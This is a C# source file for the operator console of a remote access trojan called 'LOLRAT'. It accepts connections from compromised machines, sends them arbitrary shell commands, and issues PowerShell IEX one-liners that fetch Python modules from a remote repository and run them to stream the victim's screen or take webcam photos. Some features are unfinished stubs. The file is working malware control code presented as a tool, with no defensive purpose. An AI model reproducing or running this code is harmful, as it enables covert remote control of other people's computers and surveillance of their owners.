using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LOLRAT_C2
{
    // 1.1.1
    // The first 1 in 1.1.1 is the major version number. This number is incremented when you make major changes to the code.
    // The second 1 in 1.1.1 is the minor version number. This number is incremented when you make minor changes to the code.
    // The third 1 in 1.1.1 is the patch version number. This number is incremented when you make small changes to the code.
    public partial class Main : Form
    {
        // Define a list to store connected clients
        List<ClientInfo> connectedClients = new List<ClientInfo>();
        TcpListener server = null;
        Thread listenThread;
        TcpClient client;
        NetworkStream stream;
        bool isListening = false;
        bool isMainC2 = true;
        int clientIDCounter = 1; // Counter for client identifiers
        string ActiveWindow;

        public Main()
        {
            InitializeComponent();

            // Add columns to the DataGridView
            dgvClients.Columns.Add("ID", "ID");
            dgvClients.Columns.Add("IP", "IP");
            dgvClients.Columns.Add("Port", "Port");
            dgvClients.Columns.Add("FirstSeen", "First Seen");
            dgvClients.Columns.Add("LastSeen", "Last Seen");

            // Set the selection mode to FullRowSelect
            dgvClients.SelectionMode = DataGridViewSelectionMode.FullRowSelect;
        }

        // ---------------------------------------------------------------------------
        //
        //                                  Listening
        //
        // ---------------------------------------------------------------------------
        private void StartListening()
        {
            try
            {
                int activePort = int.Parse(txtActivePort.Text);
                server = new TcpListener(IPAddress.Any, activePort);
                server.Start();
                isListening = true;

                while (isListening)
                {
                    client = server.AcceptTcpClient();
                    string clientEndPoint = client.Client.RemoteEndPoint.ToString();

                    Invoke(new Action(() =>
                    {
                        listBoxClients.Items.Add(clientEndPoint);
                        txtOutput.AppendText("New client! IP: " + clientEndPoint + "\r\n");
                    }));

                    // Extract IP and Port and add them to the DataGridView
                    string[] endPointParts = clientEndPoint.Split(':');
                    if (endPointParts.Length == 2)
                    {
                        string clientIP = endPointParts[0];
                        int clientPort = int.Parse(endPointParts[1]);

                        // Create a new instance of ClientInfo and associate the NetworkStream
                        ClientInfo clientInfo = new ClientInfo
                        {
                            ID = clientIDCounter,
                            IP = clientIP,
                            Port = clientPort,
                            Stream = client.GetStream(),
                            FirstSeen = DateTime.Now,
                            LastSeen = DateTime.Now
                        };

                        // Add the client info to the DataGridView
                        dgvClients.Invoke(new Action(() =>
                        {
                            int rowIndex = dgvClients.Rows.Add(clientInfo.ID, clientInfo.IP, clientInfo.Port, clientInfo.FirstSeen, clientInfo.LastSeen);
                            // You can set other cell values here if needed
                        }));

                        clientIDCounter++; // Increment the client identifier

                        // Add the connected client to the list
                        connectedClients.Add(clientInfo);

                        Thread receiveThread = new Thread(() => ReceiveData(clientInfo.Stream, clientInfo));
                        receiveThread.Start();
                    }
                }
            }
            catch (SocketException e)
            {
                MessageBox.Show("SocketException: " + e);
                server.Stop();
            }
        }
        private void ListenForClients()
        {
            if (!isListening)
            {
                listenThread = new Thread(new ThreadStart(StartListening));
                listenThread.Start();
            }
        }
        private void StopListening()
        {
            isListening = false;
            if (server != null)
            {
                server.Stop();
            }

            // Close all client connections when stopping the listener
            foreach (ClientInfo clientInfo in connectedClients)
            {
                clientInfo.Stream.Close();
            }
        }
        private void btnListen_Click(object sender, EventArgs e)
        {
            if (!isListening)
            {
                ListenForClients();
                btnListen.Text = "Stop Listening";
            }
            else
            {
                StopListening();
                btnListen.Text = "Start Listening";
            }
        }


        // ---------------------------------------------------------------------------
        //
        //                            Start Screensharing
        //
        // ---------------------------------------------------------------------------
        private void btnSS_Click(object sender, EventArgs e)
        {
            // Check if SS is already running
            if (Application.OpenForms.OfType<SS>().Any())
            {
                txtOutput.AppendText("SS is already running!\r\n");
                // Close the SS that is running
                Application.OpenForms["SS"].Close();
                // Send a command to client to stop SS
                txtOutput.AppendText("Sending SS command to client...\r\n");
                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
                string clientIP = selectedRow.Cells["IP"].Value.ToString();
                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
                if (selectedClient != null)
                {
                    // Create a command that kills all other python processes
                    byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/kill_ss.py\").Content'\"");
                    selectedClient.Stream.Write(data, 0, data.Length);
                    txtOutput.AppendText("Sent command to client!\r\n");
                }
            }
            else
            {
                // Ask user for input on ip and port
                string IP = Microsoft.VisualBasic.Interaction.InputBox("Enter IP (or DNS)", "IP/DNS", "");
                string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");

                // Start the SS form
                txtOutput.AppendText("Starting image sharing form...\r\n");
                SS ss = new SS();
                ss.Show();

                // Send the SS command to selected client
                txtOutput.AppendText("Sending SS command to client...\r\n");
                DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
                string clientIP = selectedRow.Cells["IP"].Value.ToString();
                int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
                ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
                if (selectedClient != null)
                {
                    byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/ss.py\").Content " + IP + " " + PORT + "'\"");
                    selectedClient.Stream.Write(data, 0, data.Length);
                    txtOutput.AppendText("Sent command to client!\r\n");
                }
                txtOutput.AppendText("Hopefully that worked...\r\n");
            }
        }


        // ---------------------------------------------------------------------------
        //
        //                              Photo with Webcam
        //
        // ---------------------------------------------------------------------------
        private void btnWebcam_Click(object sender, EventArgs e)
        {
            // Ask user for input on ip and port
            string IP = Microsoft.VisualBasic.Interaction.InputBox("Enter IP (or DNS)", "IP/DNS", "");
            string PORT = Microsoft.VisualBasic.Interaction.InputBox("Enter Port", "Port", "");

            // Start the SS form
            txtOutput.AppendText("Starting image sharing form...\r\n");
            SS ss = new SS();
            ss.Show();

            // Send the SS command to selected client
            txtOutput.AppendText("Sending Webcam command to client...\r\n");
            DataGridViewRow selectedRow = dgvClients.SelectedRows[0];
            string clientIP = selectedRow.Cells["IP"].Value.ToString();
            int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());
            ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);
            if (selectedClient != null)
            {
                byte[] data = Encoding.ASCII.GetBytes("exec$powershell -c \"IEX 'python -c (Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/WilleLX1/LOLRAT/main/Modules/webcam.py\").Content " + IP + " " + PORT + "'\"");
                selectedClient.Stream.Write(data, 0, data.Length);
                txtOutput.AppendText("Sent command to client!\r\n");
            }
            txtOutput.AppendText("Hopefully that worked...\r\n");
        }

        // ---------------------------------------------------------------------------
        //
        //                              Misc Methods
        //
        // ---------------------------------------------------------------------------
        private void btnSend_Click(object sender, EventArgs e)
        {
            if (isMainC2)
            {
                if (dgvClients.SelectedRows.Count > 0 && txtCommand.Text != "")
                {
                    try
                    {
                        // Get the selected row
                        DataGridViewRow selectedRow = dgvClients.SelectedRows[0];

                        if (selectedRow != null) // Check if a row is actually selected
                        {
                            // Extract the IP and Port from the selected row
                            string clientIP = selectedRow.Cells["IP"].Value.ToString();
                            int clientPort = int.Parse(selectedRow.Cells["Port"].Value.ToString());

                            // Find the corresponding client from the client list
                            ClientInfo selectedClient = FindClientByIPAndPort(clientIP, clientPort);

                            // Check if the selected client was found
                            if (selectedClient != null)
                            {
                                if (ActiveWindow == "Debug")
                                {
                                    byte[] data = Encoding.ASCII.GetBytes(txtCommand.Text);
                                    selectedClient.Stream.Write(data, 0, data.Length);
                                    txtOutput.AppendText("Executed this: " + txtCommand.Text + "\r\n");
                                }
                                else if (ActiveWindow == "Terminal")
                                {
                                    string Command = ("exec$" + txtCommand.Text);
                                    byte[] data = Encoding.ASCII.GetBytes(Command);
                                    selectedClient.Stream.Write(data, 0, data.Length);
                                    txtOutput.AppendText("Executed this: " + Command + "\r\n");
                                }

                            }
                        }
                    }
                    catch (IOException ex)
                    {
                        MessageBox.Show("IOException: " + ex);
                    }
                }
            }
            else
            {
                // Send the txtCommand.Text to selected client
            }
        }

        // Method to get client based on IP-address and port. 
        private ClientInfo FindClientByIPAndPort(string clientIP, int clientPort)
        {
            // Search for the client in the list based on IP and Port
            return connectedClients.Find(client => client.IP == clientIP && client.Port == clientPort);
        }
        private void ReceiveData(NetworkStream stream, ClientInfo clientInfo)
        {
            try
            {
                while (isListening)
                {
                    byte[] data = new byte[256];
                    int bytesRead = stream.Read(data, 0, data.Length);
                    if (bytesRead > 0)
                    {
                        string receivedText = Encoding.UTF8.GetString(data, 0, bytesRead);
                        Invoke(new Action(() => txtOutput.AppendText(receivedText + Environment.NewLine)));

                        // Update the "last seen" timestamp when data is received
                        clientInfo.LastSeen = DateTime.Now;

                        // Update the "LastSeen" column in the DataGridView
                        dgvClients.Invoke(new Action(() =>
                        {
                            foreach (DataGridViewRow row in dgvClients.Rows)
                            {
                                if (row.Cells["ID"].Value.ToString() == clientInfo.ID.ToString())
                                {
                                    row.Cells["LastSeen"].Value = clientInfo.LastSeen;
                                    break;
                                }
                            }
                        }));
                    }
                }
            }
            catch (IOException ex)
            {
                if (isListening)
                {
                    connectedClients.Remove(clientInfo);

                    // Decrement the client identifier counter when a client disconnects
                    clientIDCounter--;

                    // Remove the client from the listbox
                    Invoke(new Action(() =>
                    {
                        listBoxClients.Items.Remove(clientInfo.IP + ":" + clientInfo.Port);
                    }));

                    // Remove the client from the DataGridView
                    dgvClients.Invoke(new Action(() =>
                    {
                        foreach (DataGridViewRow row in dgvClients.Rows)
                        {
                            if (row.Cells["ID"].Value.ToString() == clientInfo.ID.ToString())
                            {
                                dgvClients.Rows.Remove(row);
                                break;
                            }
                        }
                    }));

                    // Output that a client has disconnected
                    Invoke(new Action(() =>
                    {
                        txtOutput.AppendText("Client disconnected: " + clientInfo.IP + ":" + clientInfo.Port + "\r\n");
                    }));

                    // Check if the exception is caused by a client disconnection
                    if (ex.InnerException is SocketException socketException && socketException.SocketErrorCode == SocketError.ConnectionReset)
                    {

                    }
                    else
                    {
                        MessageBox.Show("IOException: " + ex);
                    }
                }
            }
        }

        // ---------------------------------------------------------------------------
        //
        //                           Load/Save Client Info
        //
        // ---------------------------------------------------------------------------
        // Method to save client information to a file
        private void SaveClientInfoToFile()
        {
            try
            {
                using (StreamWriter writer = new StreamWriter("client_info.txt"))
                {
                    foreach (ClientInfo client in connectedClients)
                    {
                        writer.WriteLine($"{client.IP}:{client.Port},{client.FirstSeen},{client.LastSeen}");
                    }
                }
            }
            catch (IOException ex)
            {
                MessageBox.Show("Error saving client info to file: " + ex);
            }
        }

        // Method to load client information from a file
        private void LoadClientInfoFromFile()
        {
            try
            {
                if (File.Exists("client_info.txt"))
                {
                    using (StreamReader reader = new StreamReader("client_info.txt"))
                    {
                        string line;
                        while ((line = reader.ReadLine()) != null)
                        {
                            string[] parts = line.Split(',');

                            if (parts.Length >= 3)
                            {
                                string[] ipAndPort = parts[0].Split(':');
                                if (ipAndPort.Length == 2)
                                {
                                    string clientIP = ipAndPort[0];
                                    int clientPort = int.Parse(ipAndPort[1]);
                                    DateTime firstSeen = DateTime.Parse(parts[1]);
                                    DateTime lastSeen = DateTime.Parse(parts[2]);

                                    // Create a new instance of ClientInfo with loaded data
                                    ClientInfo clientInfo = new ClientInfo
                                    {
                                        IP = clientIP,
                                        Port = clientPort,
                                        FirstSeen = firstSeen,
                                        LastSeen = lastSeen
                                    };

                                    // Add the loaded client info to the list
                                    connectedClients.Add(clientInfo);
                                }
                            }
                        }
                    }
                }
            }
            catch (IOException ex)
            {
                MessageBox.Show("Error loading client info from file: " + ex);
            }
        }

        // Call this method to load client information when your application starts
        private void InitializeClientInfo()
        {
            LoadClientInfoFromFile();
        }


        // ---------------------------------------------------------------------------
        //
        //                         CPU, RAM and Active Window
        //
        // ---------------------------------------------------------------------------
        private void UpdateClientInformation()
        {
            foreach (ClientInfo client in connectedClients)
            {
                // Update CPU usage, RAM usage, and active window for each client
                client.CPUUsage = GetCPUUsageForClient(client);
                client.RAMUsage = GetRAMUsageForClient(client);
                client.ActiveWindow = GetActiveWindowForClient(client);
            }
        }
        private float GetCPUUsageForClient(ClientInfo client)
        {
            // Implement code to get CPU usage for the client.
            // You can use the System.Diagnostics.Process class to gather this information.
            // For example, you can get the CPU usage of the client's process by its ID.
            // Return the CPU usage as a float value (percentage).

            return 0.0f; // Replace with actual CPU usage retrieval code.
        }
        private float GetRAMUsageForClient(ClientInfo client)
        {
            // Implement code to get RAM usage for the client.
            // You can use the System.Diagnostics.Process class to gather this information.
            // For example, you can get the memory usage of the client's process by its ID.
            // Return the RAM usage as a float value (percentage).

            return 0.0f; // Replace with actual RAM usage retrieval code.
        }
        private string GetActiveWindowForClient(ClientInfo client)
        {
            // Implement code to get the active window for the client.
            // You can use platform-specific methods to retrieve the active window title.
            // Return the title of the active window as a string.

            return "Unknown"; // Replace with actual active window retrieval code.
        }


        // ---------------------------------------------------------------------------
        //
        //                       Friendly Command and Control
        //
        // ---------------------------------------------------------------------------
        private void btnStartFC2_Click(object sender, EventArgs e)
        {
            string FC2HostPort = txtFC2HostPort.Text;

            // Start listening on port "FC2HostPort". And wait for connection from a client, then start reciving and sending information about the C2 clients to the Friendly C2.
        }

        private void btnFC2Connect_Click(object sender, EventArgs e)
        {
            string FC2IP = txtFC2IP.Text;
            string FC2Port = txtFC2Port.Text;

            // Attempt to connect with tcp to the "FC2IP":"FC2Port", and wait for reciving information that will be put into the dgvClients.
        }
        private void HandleFC2Data(TcpClient fc2Client)
        {
            try
            {
                // Add code to send and receive data with the FC2 server or client.
                // This might include sending client information or receiving commands.
            }
            catch (Exception ex)
            {
                // Handle exceptions that may occur during FC2 data exchange.
                MessageBox.Show("FC2 Data Handling Error: " + ex);
            }
        }

        // ---------------------------------------------------------------------------
        //
        //                         Handle changing Windows
        //
        // ---------------------------------------------------------------------------
        private void btnShowClients_Click(object sender, EventArgs e)
        {
            // Hide all components except the DataGridView
            gbFC2.Visible = false;
            listBoxClients.Visible = false;
            txtOutput.Visible = false;
            txtCommand.Visible = false;
            btnSend.Visible = false;
            gbCommandSending.Visible = false;
            dgvClients.Visible = true;
            ActiveWindow = "Clients";
            gbClientBox.Text = "Clients";
        }

        private void btnShowDebug_Click(object sender, EventArgs e)
        {
            // Hide all components except the txtOutput and txtCommand and btnSend
            gbFC2.Visible = false;
            listBoxClients.Visible = false;
            dgvClients.Visible = false;
            txtOutput.Visible = true;
            txtCommand.Visible = true;
            btnSend.Visible = true;
            gbCommandSending.Visible = true;
            ActiveWindow = "Debug";
            gbClientBox.Text = "Debug";
        }

        private void btnShowTerminal_Click(object sender, EventArgs e)
        {
            // Hide all components except the txtOutput and txtCommand and btnSend
            gbFC2.Visible = false;
            listBoxClients.Visible = false;
            dgvClients.Visible = false;
            txtOutput.Visible = true;
            txtCommand.Visible = true;
            btnSend.Visible = true;
            gbCommandSending.Visible = true;
            ActiveWindow = "Terminal";
            gbClientBox.Text = "Terminal";
        }


        // ---------------------------------------------------------------------------
        //
        //                      Turn off listener when closing
        //
        // ---------------------------------------------------------------------------
        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            base.OnFormClosing(e);
            StopListening();
            Environment.Exit(0);
        }

    }


    // A class to store information about the client/
    public class ClientInfo
    {
        public int ID { get; set; }
        public string IP { get; set; }
        public int Port { get; set; }
        public NetworkStream Stream { get; set; } // Add a Stream property to hold the network stream
        public DateTime FirstSeen { get; set; }
        public DateTime LastSeen { get; set; }

        // New properties to store client information
        public float CPUUsage { get; set; }
        public float RAMUsage { get; set; }
        public string ActiveWindow { get; set; }

    }

}
